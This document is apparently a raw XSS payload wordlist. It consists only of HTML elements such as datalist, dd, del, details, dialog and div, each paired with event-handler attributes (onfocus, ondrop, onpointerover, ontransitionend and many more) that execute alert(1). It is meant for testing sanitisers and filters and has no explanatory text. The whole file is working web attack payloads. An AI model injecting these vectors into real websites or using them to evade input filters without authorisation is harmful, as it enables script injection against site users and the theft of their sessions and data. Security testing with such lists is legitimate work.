<datalist draggable="true" ondragleave="alert(1)" style=display:block>test</datalist>
<datalist draggable="true" ondragstart="alert(1)" style=display:block>test</datalist>
<datalist id=x style="transition:outline 1s" ontransitionend=alert(1) tabindex=1></datalist>
<datalist id=x tabindex=1 onfocus=alert(1)></datalist>
<datalist id=x tabindex=1 onfocusin=alert(1)></datalist>
<datalist onafterscriptexecute=alert(1)><script>1</script>
<datalist onbeforecopy="alert(1)" contenteditable>test</datalist>
<datalist onbeforecut="alert(1)" contenteditable>test</datalist>
<datalist onbeforescriptexecute=alert(1)><script>1</script>
<datalist onblur=alert(1) id=x tabindex=1 style=display:block>test</datalist><input value=clickme>
<datalist onclick="alert(1)" style=display:block>test</datalist>
<datalist oncontextmenu="alert(1)" style=display:block>test</datalist>
<datalist oncopy=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<datalist oncut=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<datalist ondblclick="alert(1)" autofocus tabindex=1 style=display:block>test</datalist>
<datalist onfocusout=alert(1) autofocus tabindex=1 style=display:block>test</datalist><input value=clickme>
<datalist onkeydown="alert(1)" contenteditable style=display:block>test</datalist>
<datalist onkeypress="alert(1)" contenteditable style=display:block>test</datalist>
<datalist onkeyup="alert(1)" contenteditable style=display:block>test</datalist>
<datalist onmousedown="alert(1)" style=display:block>test</datalist>
<datalist onmouseenter="alert(1)" style=display:block>test</datalist>
<datalist onmouseleave="alert(1)" style=display:block>test</datalist>
<datalist onmousemove="alert(1)" style=display:block>test</datalist>
<datalist onmouseout="alert(1)" style=display:block>test</datalist>
<datalist onmouseover="alert(1)" style=display:block>test</datalist>
<datalist onmouseup="alert(1)" style=display:block>test</datalist>
<datalist onmousewheel=alert(1) style=display:block>requires scrolling
<datalist onpaste="alert(1)" contenteditable>test</datalist>
<datalist onpointerdown=alert(1) style=display:block>XSS</datalist>
<datalist onpointerenter=alert(1) style=display:block>XSS</datalist>
<datalist onpointerleave=alert(1) style=display:block>XSS</datalist>
<datalist onpointermove=alert(1) style=display:block>XSS</datalist>
<datalist onpointerout=alert(1) style=display:block>XSS</datalist>
<datalist onpointerover=alert(1) style=display:block>XSS</datalist>
<datalist onpointerrawupdate=alert(1) style=display:block>XSS</datalist>
<datalist onpointerup=alert(1) style=display:block>XSS</datalist>
<datalist onscrollend=alert(1) style="display:block;overflow:auto;border:1px dashed;width:500px;height:100px;"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>test</span></datalist>
<dd contenteditable onbeforeinput=alert(1)>test
<dd draggable="true" ondrag="alert(1)" style=display:block>test</dd>
<dd draggable="true" ondragend="alert(1)" style=display:block>test</dd>
<dd draggable="true" ondragenter="alert(1)" style=display:block>test</dd>
<dd draggable="true" ondragleave="alert(1)" style=display:block>test</dd>
<dd draggable="true" ondragstart="alert(1)" style=display:block>test</dd>
<dd id=x style="transition:outline 1s" ontransitionend=alert(1) tabindex=1></dd>
<dd id=x tabindex=1 onfocus=alert(1)></dd>
<dd id=x tabindex=1 onfocusin=alert(1)></dd>
<dd onafterscriptexecute=alert(1)><script>1</script>
<dd onbeforecopy="alert(1)" contenteditable>test</dd>
<dd onbeforecut="alert(1)" contenteditable>test</dd>
<dd onbeforescriptexecute=alert(1)><script>1</script>
<dd onblur=alert(1) id=x tabindex=1 style=display:block>test</dd><input value=clickme>
<dd onclick="alert(1)" style=display:block>test</dd>
<dd oncontextmenu="alert(1)" style=display:block>test</dd>
<dd oncopy=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<dd oncut=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<dd ondblclick="alert(1)" autofocus tabindex=1 style=display:block>test</dd>
<dd onfocusout=alert(1) autofocus tabindex=1 style=display:block>test</dd><input value=clickme>
<dd onkeydown="alert(1)" contenteditable style=display:block>test</dd>
<dd onkeypress="alert(1)" contenteditable style=display:block>test</dd>
<dd onkeyup="alert(1)" contenteditable style=display:block>test</dd>
<dd onmousedown="alert(1)" style=display:block>test</dd>
<dd onmouseenter="alert(1)" style=display:block>test</dd>
<dd onmouseleave="alert(1)" style=display:block>test</dd>
<dd onmousemove="alert(1)" style=display:block>test</dd>
<dd onmouseout="alert(1)" style=display:block>test</dd>
<dd onmouseover="alert(1)" style=display:block>test</dd>
<dd onmouseup="alert(1)" style=display:block>test</dd>
<dd onmousewheel=alert(1) style=display:block>requires scrolling
<dd onpaste="alert(1)" contenteditable>test</dd>
<dd onpointerdown=alert(1) style=display:block>XSS</dd>
<dd onpointerenter=alert(1) style=display:block>XSS</dd>
<dd onpointerleave=alert(1) style=display:block>XSS</dd>
<dd onpointermove=alert(1) style=display:block>XSS</dd>
<dd onpointerout=alert(1) style=display:block>XSS</dd>
<dd onpointerover=alert(1) style=display:block>XSS</dd>
<dd onpointerrawupdate=alert(1) style=display:block>XSS</dd>
<dd onpointerup=alert(1) style=display:block>XSS</dd>
<dd onscrollend=alert(1) style="display:block;overflow:auto;border:1px dashed;width:500px;height:100px;"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>test</span></dd>
<del contenteditable onbeforeinput=alert(1)>test
<del draggable="true" ondrag="alert(1)" style=display:block>test</del>
<del draggable="true" ondragend="alert(1)" style=display:block>test</del>
<del draggable="true" ondragenter="alert(1)" style=display:block>test</del>
<del draggable="true" ondragleave="alert(1)" style=display:block>test</del>
<del draggable="true" ondragstart="alert(1)" style=display:block>test</del>
<del id=x style="transition:outline 1s" ontransitionend=alert(1) tabindex=1></del>
<del id=x tabindex=1 onfocus=alert(1)></del>
<del id=x tabindex=1 onfocusin=alert(1)></del>
<del onafterscriptexecute=alert(1)><script>1</script>
<del onbeforecopy="alert(1)" contenteditable>test</del>
<del onbeforecut="alert(1)" contenteditable>test</del>
<del onbeforescriptexecute=alert(1)><script>1</script>
<del onblur=alert(1) id=x tabindex=1 style=display:block>test</del><input value=clickme>
<del onclick="alert(1)" style=display:block>test</del>
<del oncontextmenu="alert(1)" style=display:block>test</del>
<del oncopy=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<del oncut=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<del ondblclick="alert(1)" autofocus tabindex=1 style=display:block>test</del>
<del onfocusout=alert(1) autofocus tabindex=1 style=display:block>test</del><input value=clickme>
<del onkeydown="alert(1)" contenteditable style=display:block>test</del>
<del onkeypress="alert(1)" contenteditable style=display:block>test</del>
<del onkeyup="alert(1)" contenteditable style=display:block>test</del>
<del onmousedown="alert(1)" style=display:block>test</del>
<del onmouseenter="alert(1)" style=display:block>test</del>
<del onmouseleave="alert(1)" style=display:block>test</del>
<del onmousemove="alert(1)" style=display:block>test</del>
<del onmouseout="alert(1)" style=display:block>test</del>
<del onmouseover="alert(1)" style=display:block>test</del>
<del onmouseup="alert(1)" style=display:block>test</del>
<del onmousewheel=alert(1) style=display:block>requires scrolling
<del onpaste="alert(1)" contenteditable>test</del>
<del onpointerdown=alert(1) style=display:block>XSS</del>
<del onpointerenter=alert(1) style=display:block>XSS</del>
<del onpointerleave=alert(1) style=display:block>XSS</del>
<del onpointermove=alert(1) style=display:block>XSS</del>
<del onpointerout=alert(1) style=display:block>XSS</del>
<del onpointerover=alert(1) style=display:block>XSS</del>
<del onpointerrawupdate=alert(1) style=display:block>XSS</del>
<del onpointerup=alert(1) style=display:block>XSS</del>
<del onscrollend=alert(1) style="display:block;overflow:auto;border:1px dashed;width:500px;height:100px;"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>test</span></del>
<details contenteditable onbeforeinput=alert(1)>test
<details draggable="true" ondrag="alert(1)" style=display:block>test</details>
<details draggable="true" ondragend="alert(1)" style=display:block>test</details>
<details draggable="true" ondragenter="alert(1)" style=display:block>test</details>
<details draggable="true" ondragleave="alert(1)" style=display:block>test</details>
<details draggable="true" ondragstart="alert(1)" style=display:block>test</details>
<details id=x style="transition:outline 1s" ontransitionend=alert(1) tabindex=1></details>
<details id=x tabindex=1 onfocus=alert(1)></details>
<details id=x tabindex=1 onfocusin=alert(1)></details>
<details onafterscriptexecute=alert(1)><script>1</script>
<details onbeforecopy="alert(1)" contenteditable>test</details>
<details onbeforecut="alert(1)" contenteditable>test</details>
<details onbeforescriptexecute=alert(1)><script>1</script>
<details onblur=alert(1) id=x tabindex=1 style=display:block>test</details><input value=clickme>
<details onclick="alert(1)" style=display:block>test</details>
<details oncontextmenu="alert(1)" style=display:block>test</details>
<details oncopy=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<details oncut=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<details ondblclick="alert(1)" autofocus tabindex=1 style=display:block>test</details>
<details onfocusout=alert(1) autofocus tabindex=1 style=display:block>test</details><input value=clickme>
<details onkeydown="alert(1)" contenteditable style=display:block>test</details>
<details onkeypress="alert(1)" contenteditable style=display:block>test</details>
<details onkeyup="alert(1)" contenteditable style=display:block>test</details>
<details onmousedown="alert(1)" style=display:block>test</details>
<details onmouseenter="alert(1)" style=display:block>test</details>
<details onmouseleave="alert(1)" style=display:block>test</details>
<details onmousemove="alert(1)" style=display:block>test</details>
<details onmouseout="alert(1)" style=display:block>test</details>
<details onmouseover="alert(1)" style=display:block>test</details>
<details onmouseup="alert(1)" style=display:block>test</details>
<details onmousewheel=alert(1) style=display:block>requires scrolling
<details onpaste="alert(1)" contenteditable>test</details>
<details onpointerdown=alert(1) style=display:block>XSS</details>
<details onpointerenter=alert(1) style=display:block>XSS</details>
<details onpointerleave=alert(1) style=display:block>XSS</details>
<details onpointermove=alert(1) style=display:block>XSS</details>
<details onpointerout=alert(1) style=display:block>XSS</details>
<details onpointerover=alert(1) style=display:block>XSS</details>
<details onpointerrawupdate=alert(1) style=display:block>XSS</details>
<details onpointerup=alert(1) style=display:block>XSS</details>
<details onscrollend=alert(1) style="display:block;overflow:auto;border:1px dashed;width:500px;height:100px;"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>test</span></details>
<details ontoggle=alert(1) open>test</details>
<dfn contenteditable onbeforeinput=alert(1)>test
<dfn draggable="true" ondrag="alert(1)" style=display:block>test</dfn>
<dfn draggable="true" ondragend="alert(1)" style=display:block>test</dfn>
<dfn draggable="true" ondragenter="alert(1)" style=display:block>test</dfn>
<dfn draggable="true" ondragleave="alert(1)" style=display:block>test</dfn>
<dfn draggable="true" ondragstart="alert(1)" style=display:block>test</dfn>
<dfn id=x style="transition:outline 1s" ontransitionend=alert(1) tabindex=1></dfn>
<dfn id=x tabindex=1 onfocus=alert(1)></dfn>
<dfn id=x tabindex=1 onfocusin=alert(1)></dfn>
<dfn onafterscriptexecute=alert(1)><script>1</script>
<dfn onbeforecopy="alert(1)" contenteditable>test</dfn>
<dfn onbeforecut="alert(1)" contenteditable>test</dfn>
<dfn onbeforescriptexecute=alert(1)><script>1</script>
<dfn onblur=alert(1) id=x tabindex=1 style=display:block>test</dfn><input value=clickme>
<dfn onclick="alert(1)" style=display:block>test</dfn>
<dfn oncontextmenu="alert(1)" style=display:block>test</dfn>
<dfn oncopy=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<dfn oncut=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<dfn ondblclick="alert(1)" autofocus tabindex=1 style=display:block>test</dfn>
<dfn onfocusout=alert(1) autofocus tabindex=1 style=display:block>test</dfn><input value=clickme>
<dfn onkeydown="alert(1)" contenteditable style=display:block>test</dfn>
<dfn onkeypress="alert(1)" contenteditable style=display:block>test</dfn>
<dfn onkeyup="alert(1)" contenteditable style=display:block>test</dfn>
<dfn onmousedown="alert(1)" style=display:block>test</dfn>
<dfn onmouseenter="alert(1)" style=display:block>test</dfn>
<dfn onmouseleave="alert(1)" style=display:block>test</dfn>
<dfn onmousemove="alert(1)" style=display:block>test</dfn>
<dfn onmouseout="alert(1)" style=display:block>test</dfn>
<dfn onmouseover="alert(1)" style=display:block>test</dfn>
<dfn onmouseup="alert(1)" style=display:block>test</dfn>
<dfn onmousewheel=alert(1) style=display:block>requires scrolling
<dfn onpaste="alert(1)" contenteditable>test</dfn>
<dfn onpointerdown=alert(1) style=display:block>XSS</dfn>
<dfn onpointerenter=alert(1) style=display:block>XSS</dfn>
<dfn onpointerleave=alert(1) style=display:block>XSS</dfn>
<dfn onpointermove=alert(1) style=display:block>XSS</dfn>
<dfn onpointerout=alert(1) style=display:block>XSS</dfn>
<dfn onpointerover=alert(1) style=display:block>XSS</dfn>
<dfn onpointerrawupdate=alert(1) style=display:block>XSS</dfn>
<dfn onpointerup=alert(1) style=display:block>XSS</dfn>
<dfn onscrollend=alert(1) style="display:block;overflow:auto;border:1px dashed;width:500px;height:100px;"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>test</span></dfn>
<dialog contenteditable onbeforeinput=alert(1)>test
<dialog draggable="true" ondrag="alert(1)" style=display:block>test</dialog>
<dialog draggable="true" ondragend="alert(1)" style=display:block>test</dialog>
<dialog draggable="true" ondragenter="alert(1)" style=display:block>test</dialog>
<dialog draggable="true" ondragleave="alert(1)" style=display:block>test</dialog>
<dialog draggable="true" ondragstart="alert(1)" style=display:block>test</dialog>
<dialog id=x style="transition:outline 1s" ontransitionend=alert(1) tabindex=1></dialog>
<dialog id=x tabindex=1 onfocus=alert(1)></dialog>
<dialog id=x tabindex=1 onfocusin=alert(1)></dialog>
<dialog onafterscriptexecute=alert(1)><script>1</script>
<dialog onbeforecopy="alert(1)" contenteditable>test</dialog>
<dialog onbeforecut="alert(1)" contenteditable>test</dialog>
<dialog onbeforescriptexecute=alert(1)><script>1</script>
<dialog onblur=alert(1) id=x tabindex=1 style=display:block>test</dialog><input value=clickme>
<dialog onclick="alert(1)" style=display:block>test</dialog>
<dialog oncontextmenu="alert(1)" style=display:block>test</dialog>
<dialog oncopy=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<dialog oncut=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<dialog ondblclick="alert(1)" autofocus tabindex=1 style=display:block>test</dialog>
<dialog onfocusout=alert(1) autofocus tabindex=1 style=display:block>test</dialog><input value=clickme>
<dialog onkeydown="alert(1)" contenteditable style=display:block>test</dialog>
<dialog onkeypress="alert(1)" contenteditable style=display:block>test</dialog>
<dialog onkeyup="alert(1)" contenteditable style=display:block>test</dialog>
<dialog onmousedown="alert(1)" style=display:block>test</dialog>
<dialog onmouseenter="alert(1)" style=display:block>test</dialog>
<dialog onmouseleave="alert(1)" style=display:block>test</dialog>
<dialog onmousemove="alert(1)" style=display:block>test</dialog>
<dialog onmouseout="alert(1)" style=display:block>test</dialog>
<dialog onmouseover="alert(1)" style=display:block>test</dialog>
<dialog onmouseup="alert(1)" style=display:block>test</dialog>
<dialog onmousewheel=alert(1) style=display:block>requires scrolling
<dialog onpaste="alert(1)" contenteditable>test</dialog>
<dialog onpointerdown=alert(1) style=display:block>XSS</dialog>
<dialog onpointerenter=alert(1) style=display:block>XSS</dialog>
<dialog onpointerleave=alert(1) style=display:block>XSS</dialog>
<dialog onpointermove=alert(1) style=display:block>XSS</dialog>
<dialog onpointerout=alert(1) style=display:block>XSS</dialog>
<dialog onpointerover=alert(1) style=display:block>XSS</dialog>
<dialog onpointerrawupdate=alert(1) style=display:block>XSS</dialog>
<dialog onpointerup=alert(1) style=display:block>XSS</dialog>
<dialog onscrollend=alert(1) style="display:block;overflow:auto;border:1px dashed;width:500px;height:100px;"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>test</span></dialog>
<dialog open onclose=alert(1)><form method=dialog><button>XSS</button></form>
<dir contenteditable onbeforeinput=alert(1)>test
<dir draggable="true" ondrag="alert(1)" style=display:block>test</dir>
<dir draggable="true" ondragend="alert(1)" style=display:block>test</dir>
<dir draggable="true" ondragenter="alert(1)" style=display:block>test</dir>
<dir draggable="true" ondragleave="alert(1)" style=display:block>test</dir>
<dir draggable="true" ondragstart="alert(1)" style=display:block>test</dir>
<dir id=x style="transition:outline 1s" ontransitionend=alert(1) tabindex=1></dir>
<dir id=x tabindex=1 onfocus=alert(1)></dir>
<dir id=x tabindex=1 onfocusin=alert(1)></dir>
<dir onafterscriptexecute=alert(1)><script>1</script>
<dir onbeforecopy="alert(1)" contenteditable>test</dir>
<dir onbeforecut="alert(1)" contenteditable>test</dir>
<dir onbeforescriptexecute=alert(1)><script>1</script>
<dir onblur=alert(1) id=x tabindex=1 style=display:block>test</dir><input value=clickme>
<dir onclick="alert(1)" style=display:block>test</dir>
<dir oncontextmenu="alert(1)" style=display:block>test</dir>
<dir oncopy=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<dir oncut=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<dir ondblclick="alert(1)" autofocus tabindex=1 style=display:block>test</dir>
<dir onfocusout=alert(1) autofocus tabindex=1 style=display:block>test</dir><input value=clickme>
<dir onkeydown="alert(1)" contenteditable style=display:block>test</dir>
<dir onkeypress="alert(1)" contenteditable style=display:block>test</dir>
<dir onkeyup="alert(1)" contenteditable style=display:block>test</dir>
<dir onmousedown="alert(1)" style=display:block>test</dir>
<dir onmouseenter="alert(1)" style=display:block>test</dir>
<dir onmouseleave="alert(1)" style=display:block>test</dir>
<dir onmousemove="alert(1)" style=display:block>test</dir>
<dir onmouseout="alert(1)" style=display:block>test</dir>
<dir onmouseover="alert(1)" style=display:block>test</dir>
<dir onmouseup="alert(1)" style=display:block>test</dir>
<dir onmousewheel=alert(1) style=display:block>requires scrolling
<dir onpaste="alert(1)" contenteditable>test</dir>
<dir onpointerdown=alert(1) style=display:block>XSS</dir>
<dir onpointerenter=alert(1) style=display:block>XSS</dir>
<dir onpointerleave=alert(1) style=display:block>XSS</dir>
<dir onpointermove=alert(1) style=display:block>XSS</dir>
<dir onpointerout=alert(1) style=display:block>XSS</dir>
<dir onpointerover=alert(1) style=display:block>XSS</dir>
<dir onpointerrawupdate=alert(1) style=display:block>XSS</dir>
<dir onpointerup=alert(1) style=display:block>XSS</dir>
<dir onscrollend=alert(1) style="display:block;overflow:auto;border:1px dashed;width:500px;height:100px;"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>test</span></dir>
<div contenteditable onbeforeinput=alert(1)>test
<div contextmenu=xss><p>Right click<menu type=context id=xss onshow=alert(1)></menu></div>
<div draggable="true" contenteditable>drag me</div><a ondragover=alert(1) contenteditable style=display:block>drop here</a>
<div draggable="true" contenteditable>drag me</div><a ondrop=alert(1) contenteditable style=display:block>drop here</a>
<div draggable="true" contenteditable>drag me</div><a2 ondragover=alert(1) contenteditable style=display:block>drop here</a2>
<div draggable="true" contenteditable>drag me</div><a2 ondrop=alert(1) contenteditable style=display:block>drop here</a2>
<div draggable="true" contenteditable>drag me</div><abbr ondragover=alert(1) contenteditable style=display:block>drop here</abbr>
<div draggable="true" contenteditable>drag me</div><abbr ondrop=alert(1) contenteditable style=display:block>drop here</abbr>
<div draggable="true" contenteditable>drag me</div><acronym ondragover=alert(1) contenteditable style=display:block>drop here</acronym>
<div draggable="true" contenteditable>drag me</div><acronym ondrop=alert(1) contenteditable style=display:block>drop here</acronym>
<div draggable="true" contenteditable>drag me</div><address ondragover=alert(1) contenteditable style=display:block>drop here</address>
<div draggable="true" contenteditable>drag me</div><address ondrop=alert(1) contenteditable style=display:block>drop here</address>
<div draggable="true" contenteditable>drag me</div><animate ondragover=alert(1) contenteditable style=display:block>drop here</animate>
<div draggable="true" contenteditable>drag me</div><animate ondrop=alert(1) contenteditable style=display:block>drop here</animate>
<div draggable="true" contenteditable>drag me</div><animatemotion ondragover=alert(1) contenteditable style=display:block>drop here</animatemotion>
<div draggable="true" contenteditable>drag me</div><animatemotion ondrop=alert(1) contenteditable style=display:block>drop here</animatemotion>
<div draggable="true" contenteditable>drag me</div><animatetransform ondragover=alert(1) contenteditable style=display:block>drop here</animatetransform>
<div draggable="true" contenteditable>drag me</div><animatetransform ondrop=alert(1) contenteditable style=display:block>drop here</animatetransform>
<div draggable="true" contenteditable>drag me</div><applet ondragover=alert(1) contenteditable style=display:block>drop here</applet>
<div draggable="true" contenteditable>drag me</div><applet ondrop=alert(1) contenteditable style=display:block>drop here</applet>
<div draggable="true" contenteditable>drag me</div><area ondragover=alert(1) contenteditable style=display:block>drop here</area>
<div draggable="true" contenteditable>drag me</div><area ondrop=alert(1) contenteditable style=display:block>drop here</area>
<div draggable="true" contenteditable>drag me</div><article ondragover=alert(1) contenteditable style=display:block>drop here</article>
<div draggable="true" contenteditable>drag me</div><article ondrop=alert(1) contenteditable style=display:block>drop here</article>
<div draggable="true" contenteditable>drag me</div><aside ondragover=alert(1) contenteditable style=display:block>drop here</aside>
<div draggable="true" contenteditable>drag me</div><aside ondrop=alert(1) contenteditable style=display:block>drop here</aside>
<div draggable="true" contenteditable>drag me</div><audio ondragover=alert(1) contenteditable style=display:block>drop here</audio>
<div draggable="true" contenteditable>drag me</div><audio ondrop=alert(1) contenteditable style=display:block>drop here</audio>
<div draggable="true" contenteditable>drag me</div><audio2 ondragover=alert(1) contenteditable style=display:block>drop here</audio2>
<div draggable="true" contenteditable>drag me</div><audio2 ondrop=alert(1) contenteditable style=display:block>drop here</audio2>
<div draggable="true" contenteditable>drag me</div><b ondragover=alert(1) contenteditable style=display:block>drop here</b>
<div draggable="true" contenteditable>drag me</div><b ondrop=alert(1) contenteditable style=display:block>drop here</b>
<div draggable="true" contenteditable>drag me</div><bdi ondragover=alert(1) contenteditable style=display:block>drop here</bdi>
<div draggable="true" contenteditable>drag me</div><bdi ondrop=alert(1) contenteditable style=display:block>drop here</bdi>
<div draggable="true" contenteditable>drag me</div><bdo ondragover=alert(1) contenteditable style=display:block>drop here</bdo>
<div draggable="true" contenteditable>drag me</div><bdo ondrop=alert(1) contenteditable style=display:block>drop here</bdo>
<div draggable="true" contenteditable>drag me</div><big ondragover=alert(1) contenteditable style=display:block>drop here</big>
<div draggable="true" contenteditable>drag me</div><big ondrop=alert(1) contenteditable style=display:block>drop here</big>
<div draggable="true" contenteditable>drag me</div><blink ondragover=alert(1) contenteditable style=display:block>drop here</blink>
<div draggable="true" contenteditable>drag me</div><blink ondrop=alert(1) contenteditable style=display:block>drop here</blink>
<div draggable="true" contenteditable>drag me</div><blockquote ondragover=alert(1) contenteditable style=display:block>drop here</blockquote>
<div draggable="true" contenteditable>drag me</div><blockquote ondrop=alert(1) contenteditable style=display:block>drop here</blockquote>
<div draggable="true" contenteditable>drag me</div><body ondragover=alert(1) contenteditable style=display:block>drop here</body>
<div draggable="true" contenteditable>drag me</div><body ondrop=alert(1) contenteditable style=display:block>drop here</body>
<div draggable="true" contenteditable>drag me</div><br ondragover=alert(1) contenteditable style=display:block>drop here</br>
<div draggable="true" contenteditable>drag me</div><br ondrop=alert(1) contenteditable style=display:block>drop here</br>
<div draggable="true" contenteditable>drag me</div><button ondragover=alert(1) contenteditable style=display:block>drop here</button>
<div draggable="true" contenteditable>drag me</div><button ondrop=alert(1) contenteditable style=display:block>drop here</button>
<div draggable="true" contenteditable>drag me</div><canvas ondragover=alert(1) contenteditable style=display:block>drop here</canvas>
<div draggable="true" contenteditable>drag me</div><canvas ondrop=alert(1) contenteditable style=display:block>drop here</canvas>
<div draggable="true" contenteditable>drag me</div><caption ondragover=alert(1) contenteditable style=display:block>drop here</caption>
<div draggable="true" contenteditable>drag me</div><caption ondrop=alert(1) contenteditable style=display:block>drop here</caption>
<div draggable="true" contenteditable>drag me</div><center ondragover=alert(1) contenteditable style=display:block>drop here</center>
<div draggable="true" contenteditable>drag me</div><center ondrop=alert(1) contenteditable style=display:block>drop here</center>
<div draggable="true" contenteditable>drag me</div><cite ondragover=alert(1) contenteditable style=display:block>drop here</cite>
<div draggable="true" contenteditable>drag me</div><cite ondrop=alert(1) contenteditable style=display:block>drop here</cite>
<div draggable="true" contenteditable>drag me</div><code ondragover=alert(1) contenteditable style=display:block>drop here</code>
<div draggable="true" contenteditable>drag me</div><code ondrop=alert(1) contenteditable style=display:block>drop here</code>
<div draggable="true" contenteditable>drag me</div><col ondragover=alert(1) contenteditable style=display:block>drop here</col>
<div draggable="true" contenteditable>drag me</div><col ondrop=alert(1) contenteditable style=display:block>drop here</col>
<div draggable="true" contenteditable>drag me</div><colgroup ondragover=alert(1) contenteditable style=display:block>drop here</colgroup>
<div draggable="true" contenteditable>drag me</div><colgroup ondrop=alert(1) contenteditable style=display:block>drop here</colgroup>
<div draggable="true" contenteditable>drag me</div><command ondragover=alert(1) contenteditable style=display:block>drop here</command>
<div draggable="true" contenteditable>drag me</div><command ondrop=alert(1) contenteditable style=display:block>drop here</command>
<div draggable="true" contenteditable>drag me</div><content ondragover=alert(1) contenteditable style=display:block>drop here</content>
<div draggable="true" contenteditable>drag me</div><content ondrop=alert(1) contenteditable style=display:block>drop here</content>
<div draggable="true" contenteditable>drag me</div><custom tags ondragover=alert(1) contenteditable style=display:block>drop here</custom tags>
<div draggable="true" contenteditable>drag me</div><custom tags ondrop=alert(1) contenteditable style=display:block>drop here</custom tags>
<div draggable="true" contenteditable>drag me</div><data ondragover=alert(1) contenteditable style=display:block>drop here</data>
<div draggable="true" contenteditable>drag me</div><data ondrop=alert(1) contenteditable style=display:block>drop here</data>
<div draggable="true" contenteditable>drag me</div><datalist ondragover=alert(1) contenteditable style=display:block>drop here</datalist>
<div draggable="true" contenteditable>drag me</div><datalist ondrop=alert(1) contenteditable style=display:block>drop here</datalist>
<div draggable="true" contenteditable>drag me</div><dd ondragover=alert(1) contenteditable style=display:block>drop here</dd>
<div draggable="true" contenteditable>drag me</div><dd ondrop=alert(1) contenteditable style=display:block>drop here</dd>
<div draggable="true" contenteditable>drag me</div><del ondragover=alert(1) contenteditable style=display:block>drop here</del>
<div draggable="true" contenteditable>drag me</div><del ondrop=alert(1) contenteditable style=display:block>drop here</del>
<div draggable="true" contenteditable>drag me</div><details ondragover=alert(1) contenteditable style=display:block>drop here</details>
<div draggable="true" contenteditable>drag me</div><details ondrop=alert(1) contenteditable style=display:block>drop here</details>
<div draggable="true" contenteditable>drag me</div><dfn ondragover=alert(1) contenteditable style=display:block>drop here</dfn>
<div draggable="true" contenteditable>drag me</div><dfn ondrop=alert(1) contenteditable style=display:block>drop here</dfn>
<div draggable="true" contenteditable>drag me</div><dialog ondragover=alert(1) contenteditable style=display:block>drop here</dialog>
<div draggable="true" contenteditable>drag me</div><dialog ondrop=alert(1) contenteditable style=display:block>drop here</dialog>
<div draggable="true" contenteditable>drag me</div><dir ondragover=alert(1) contenteditable style=display:block>drop here</dir>
<div draggable="true" contenteditable>drag me</div><dir ondrop=alert(1) contenteditable style=display:block>drop here</dir>
<div draggable="true" contenteditable>drag me</div><div ondragover=alert(1) contenteditable style=display:block>drop here</div>
<div draggable="true" contenteditable>drag me</div><div ondrop=alert(1) contenteditable style=display:block>drop here</div>
<div draggable="true" contenteditable>drag me</div><dl ondragover=alert(1) contenteditable style=display:block>drop here</dl>
<div draggable="true" contenteditable>drag me</div><dl ondrop=alert(1) contenteditable style=display:block>drop here</dl>
<div draggable="true" contenteditable>drag me</div><dt ondragover=alert(1) contenteditable style=display:block>drop here</dt>
<div draggable="true" contenteditable>drag me</div><dt ondrop=alert(1) contenteditable style=display:block>drop here</dt>
<div draggable="true" contenteditable>drag me</div><element ondragover=alert(1) contenteditable style=display:block>drop here</element>
<div draggable="true" contenteditable>drag me</div><element ondrop=alert(1) contenteditable style=display:block>drop here</element>
<div draggable="true" contenteditable>drag me</div><em ondragover=alert(1) contenteditable style=display:block>drop here</em>
<div draggable="true" contenteditable>drag me</div><em ondrop=alert(1) contenteditable style=display:block>drop here</em>
<div draggable="true" contenteditable>drag me</div><embed ondragover=alert(1) contenteditable style=display:block>drop here</embed>
<div draggable="true" contenteditable>drag me</div><embed ondrop=alert(1) contenteditable style=display:block>drop here</embed>
<div draggable="true" contenteditable>drag me</div><fieldset ondragover=alert(1) contenteditable style=display:block>drop here</fieldset>
<div draggable="true" contenteditable>drag me</div><fieldset ondrop=alert(1) contenteditable style=display:block>drop here</fieldset>
<div draggable="true" contenteditable>drag me</div><figcaption ondragover=alert(1) contenteditable style=display:block>drop here</figcaption>
<div draggable="true" contenteditable>drag me</div><figcaption ondrop=alert(1) contenteditable style=display:block>drop here</figcaption>
<div draggable="true" contenteditable>drag me</div><figure ondragover=alert(1) contenteditable style=display:block>drop here</figure>
<div draggable="true" contenteditable>drag me</div><figure ondrop=alert(1) contenteditable style=display:block>drop here</figure>
<div draggable="true" contenteditable>drag me</div><font ondragover=alert(1) contenteditable style=display:block>drop here</font>
<div draggable="true" contenteditable>drag me</div><font ondrop=alert(1) contenteditable style=display:block>drop here</font>
<div draggable="true" contenteditable>drag me</div><footer ondragover=alert(1) contenteditable style=display:block>drop here</footer>
<div draggable="true" contenteditable>drag me</div><footer ondrop=alert(1) contenteditable style=display:block>drop here</footer>
<div draggable="true" contenteditable>drag me</div><form ondragover=alert(1) contenteditable style=display:block>drop here</form>
<div draggable="true" contenteditable>drag me</div><form ondrop=alert(1) contenteditable style=display:block>drop here</form>
<div draggable="true" contenteditable>drag me</div><frame ondragover=alert(1) contenteditable style=display:block>drop here</frame>
